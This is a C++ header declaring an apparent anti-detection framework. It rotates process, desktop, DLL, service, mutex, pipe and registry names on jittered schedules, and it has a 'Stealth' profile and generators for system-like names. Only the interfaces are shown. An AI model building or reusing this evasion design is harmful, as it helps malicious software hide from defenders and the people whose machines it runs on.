#pragma once

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <functional>

namespace AutoRotation {

enum class RotationType {
    PROCESS_NAMES,
    DESKTOP_NAMES,
    DLL_NAMES,
    TEMP_FILES,
    REGISTRY_KEYS,
    SERVICE_NAMES,
    MUTEX_NAMES,
    EVENT_NAMES,
    PIPE_NAMES,
    DIRECTORY_NAMES
};

struct RotationConfig {
    RotationType type;
    DWORD intervalMs;
    bool enabled;
    std::vector<std::string> namePool;
    std::string currentName;
    DWORD maxRotations;
    DWORD rotationCount;
    
    RotationConfig() : type(RotationType::PROCESS_NAMES), intervalMs(300000), 
                      enabled(false), maxRotations(0), rotationCount(0) {}
};

struct RotationEvent {
    RotationType type;
    std::string oldName;
    std::string newName;
    DWORD timestamp;
    bool success;
    std::string errorMessage;
    
    RotationEvent() : type(RotationType::PROCESS_NAMES), timestamp(0), success(false) {}
};

class NameRotator {
public:
    NameRotator();
    ~NameRotator();

    bool RegisterRotationType(RotationType type, const RotationConfig& config);
    bool UnregisterRotationType(RotationType type);
    
    bool EnableRotation(RotationType type, bool enable = true);
    bool IsRotationEnabled(RotationType type) const;
    
    bool SetRotationInterval(RotationType type, DWORD intervalMs);
    DWORD GetRotationInterval(RotationType type) const;
    
    bool SetNamePool(RotationType type, const std::vector<std::string>& names);
    std::vector<std::string> GetNamePool(RotationType type) const;
    
    std::string GetCurrentName(RotationType type) const;
    bool SetCurrentName(RotationType type, const std::string& name);
    
    bool PerformRotation(RotationType type);
    void PerformAllRotations();
    
    bool StartAutoRotation();
    void StopAutoRotation();
    bool IsAutoRotationActive() const;
    
    std::vector<RotationEvent> GetRotationHistory(RotationType type = RotationType::PROCESS_NAMES) const;
    void ClearRotationHistory(RotationType type = RotationType::PROCESS_NAMES);
    
    void SetRotationCallback(RotationType type, std::function<void(const RotationEvent&)> callback);

private:
    std::string GenerateRandomName(RotationType type);
    std::string SelectFromPool(RotationType type);
    void LoadDefaultNamePools();
    void RecordRotationEvent(const RotationEvent& event);
    
    static DWORD WINAPI RotationThreadProc(LPVOID lpParam);
    void RotationWorker();
    
    std::map<RotationType, RotationConfig> m_configs;
    std::map<RotationType, std::vector<RotationEvent>> m_history;
    std::map<RotationType, std::function<void(const RotationEvent&)>> m_callbacks;
    
    HANDLE m_rotationThread;
    HANDLE m_shutdownEvent;
    CRITICAL_SECTION m_criticalSection;
    bool m_autoRotationActive;
};

class TempFileManager {
public:
    TempFileManager();
    ~TempFileManager();

    std::string CreateTempFile(const std::string& prefix = "", const std::string& extension = ".tmp");
    std::string CreateTempDirectory(const std::string& prefix = "");
    
    bool RegisterTempFile(const std::string& filePath, DWORD lifetimeMs = 0);
    bool RegisterTempDirectory(const std::string& dirPath, DWORD lifetimeMs = 0);
    
    bool UnregisterTempFile(const std::string& filePath);
    bool UnregisterTempDirectory(const std::string& dirPath);
    
    void CleanupExpiredFiles();
    void CleanupAllTempFiles();
    
    bool SetTempBaseDirectory(const std::string& baseDir);
    std::string GetTempBaseDirectory() const;
    
    bool EnableAutoCleanup(bool enable, DWORD cleanupIntervalMs = 600000);
    bool IsAutoCleanupEnabled() const;
    
    void SetMaxTempFiles(DWORD maxFiles);
    DWORD GetMaxTempFiles() const;
    
    std::vector<std::string> GetActiveTempFiles() const;
    std::vector<std::string> GetActiveTempDirectories() const;
    
    DWORD GetTempFileCount() const;
    DWORD GetTempDirCount() const;

private:
    struct TempFileInfo {
        std::string path;
        DWORD creationTime;
        DWORD lifetimeMs;
        bool isDirectory;
        
        TempFileInfo() : creationTime(0), lifetimeMs(0), isDirectory(false) {}
        TempFileInfo(const std::string& p, DWORD lifetime, bool isDir) 
            : path(p), creationTime(GetTickCount()), lifetimeMs(lifetime), isDirectory(isDir) {}
    };

    std::string GenerateUniquePath(const std::string& prefix, const std::string& extension, bool isDirectory);
    bool DeletePath(const std::string& path, bool isDirectory);
    bool IsPathExpired(const TempFileInfo& info) const;
    
    static DWORD WINAPI CleanupThreadProc(LPVOID lpParam);
    void CleanupWorker();
    
    std::vector<TempFileInfo> m_tempFiles;
    std::string m_baseDirectory;
    DWORD m_maxTempFiles;
    
    bool m_autoCleanupEnabled;
    DWORD m_cleanupInterval;
    HANDLE m_cleanupThread;
    HANDLE m_shutdownEvent;
    CRITICAL_SECTION m_criticalSection;
};

class RotationScheduler {
public:
    RotationScheduler();
    ~RotationScheduler();

    struct ScheduledRotation {
        RotationType type;
        DWORD nextRotationTime;
        DWORD intervalMs;
        bool enabled;
        DWORD priority;
        
        ScheduledRotation() : type(RotationType::PROCESS_NAMES), nextRotationTime(0), 
                             intervalMs(300000), enabled(false), priority(1) {}
    };

    bool ScheduleRotation(RotationType type, DWORD intervalMs, DWORD priority = 1);
    bool UnscheduleRotation(RotationType type);
    
    bool EnableScheduledRotation(RotationType type, bool enable = true);
    bool IsRotationScheduled(RotationType type) const;
    
    bool SetRotationPriority(RotationType type, DWORD priority);
    DWORD GetRotationPriority(RotationType type) const;
    
    void ProcessSchedule();
    std::vector<ScheduledRotation> GetActiveSchedule() const;
    
    bool StartScheduler();
    void StopScheduler();
    bool IsSchedulerActive() const;
    
    void SetRotationJitter(DWORD jitterMs);
    DWORD GetRotationJitter() const;

private:
    static DWORD WINAPI SchedulerThreadProc(LPVOID lpParam);
    void SchedulerWorker();
    
    DWORD ApplyJitter(DWORD baseTime) const;
    void SortScheduleByPriority();
    
    std::vector<ScheduledRotation> m_schedule;
    NameRotator m_nameRotator;
    
    DWORD m_jitterMs;
    bool m_schedulerActive;
    HANDLE m_schedulerThread;
    HANDLE m_shutdownEvent;
    CRITICAL_SECTION m_criticalSection;
};

class RotationProfileManager {
public:
    RotationProfileManager();
    ~RotationProfileManager();

    struct RotationProfile {
        std::string name;
        std::string description;
        std::map<RotationType, RotationConfig> configs;
        DWORD globalInterval;
        bool autoRotationEnabled;
        DWORD maxRotationsPerHour;
        
        RotationProfile() : globalInterval(300000), autoRotationEnabled(false), 
                           maxRotationsPerHour(20) {}
    };

    bool CreateProfile(const std::string& name, const RotationProfile& profile);
    bool DeleteProfile(const std::string& name);
    bool LoadProfile(const std::string& name);
    bool SaveProfile(const std::string& name, const RotationProfile& profile);
    
    RotationProfile GetCurrentProfile() const;
    std::string GetCurrentProfileName() const;
    std::vector<std::string> GetAvailableProfiles() const;
    
    bool ExportProfile(const std::string& name, const std::string& filePath);
    bool ImportProfile(const std::string& filePath, const std::string& newName = "");
    
    bool SetDefaultProfile(const std::string& name);
    std::string GetDefaultProfile() const;
    
    void LoadBuiltinProfiles();

private:
    void CreateStealthProfile();
    void CreateAggressiveProfile();
    void CreateConservativeProfile();
    
    std::map<std::string, RotationProfile> m_profiles;
    std::string m_currentProfile;
    std::string m_defaultProfile;
    std::string m_profilesDirectory;
};

class RotationManager {
public:
    static RotationManager& GetInstance();
    
    void Initialize();
    void Shutdown();
    
    NameRotator& GetNameRotator();
    TempFileManager& GetTempFileManager();
    RotationScheduler& GetRotationScheduler();
    RotationProfileManager& GetProfileManager();
    
    bool LoadConfiguration(const std::string& configPath);
    bool SaveConfiguration(const std::string& configPath);
    
    void SetMasterRotationEnabled(bool enabled);
    bool IsMasterRotationEnabled() const;
    
    void EmergencyRotation();
    void PauseAllRotations();
    void ResumeAllRotations();
    
    void LogRotationActivity(const std::string& activity, RotationType type);
    
    struct RotationStats {
        DWORD totalRotations;
        DWORD successfulRotations;
        DWORD failedRotations;
        DWORD averageRotationTime;
        DWORD lastRotationTime;
        std::map<RotationType, DWORD> rotationsByType;
        
        RotationStats() : totalRotations(0), successfulRotations(0), 
                         failedRotations(0), averageRotationTime(0), lastRotationTime(0) {}
    };
    
    RotationStats GetRotationStats() const;
    void ResetRotationStats();

private:
    RotationManager();
    ~RotationManager();
    
    RotationManager(const RotationManager&) = delete;
    RotationManager& operator=(const RotationManager&) = delete;
    
    void LoadDefaultConfiguration();
    void UpdateRotationStats(RotationType type, bool success, DWORD executionTime);
    
    std::unique_ptr<NameRotator> m_nameRotator;
    std::unique_ptr<TempFileManager> m_tempFileManager;
    std::unique_ptr<RotationScheduler> m_rotationScheduler;
    std::unique_ptr<RotationProfileManager> m_profileManager;
    
    bool m_masterRotationEnabled;
    bool m_rotationsPaused;
    bool m_initialized;
    
    RotationStats m_stats;
    CRITICAL_SECTION m_statsCriticalSection;
};

namespace Utils {
    std::string GenerateRandomIdentifier(DWORD length = 8);
    std::string GenerateProcessLikeName();
    std::string GenerateServiceLikeName();
    std::string GenerateSystemLikeName();
    
    bool IsValidRotationType(RotationType type);
    std::string RotationTypeToString(RotationType type);
    RotationType StringToRotationType(const std::string& str);
    
    DWORD CalculateOptimalInterval(RotationType type, DWORD baseInterval);
    DWORD GenerateJitteredInterval(DWORD baseInterval, DWORD jitterPercent = 25);
    
    bool IsSystemName(const std::string& name, RotationType type);
    bool IsValidName(const std::string& name, RotationType type);
}

#define AUTO_ROTATE_PROCESS_NAME() \
    AutoRotation::RotationManager::GetInstance().GetNameRotator().PerformRotation(AutoRotation::RotationType::PROCESS_NAMES)

#define AUTO_ROTATE_DESKTOP_NAME() \
    AutoRotation::RotationManager::GetInstance().GetNameRotator().PerformRotation(AutoRotation::RotationType::DESKTOP_NAMES)

#define CREATE_TEMP_FILE(prefix, ext) \
    AutoRotation::RotationManager::GetInstance().GetTempFileManager().CreateTempFile(prefix, ext)

#define REGISTER_TEMP_FILE(path, lifetime) \
    AutoRotation::RotationManager::GetInstance().GetTempFileManager().RegisterTempFile(path, lifetime)

}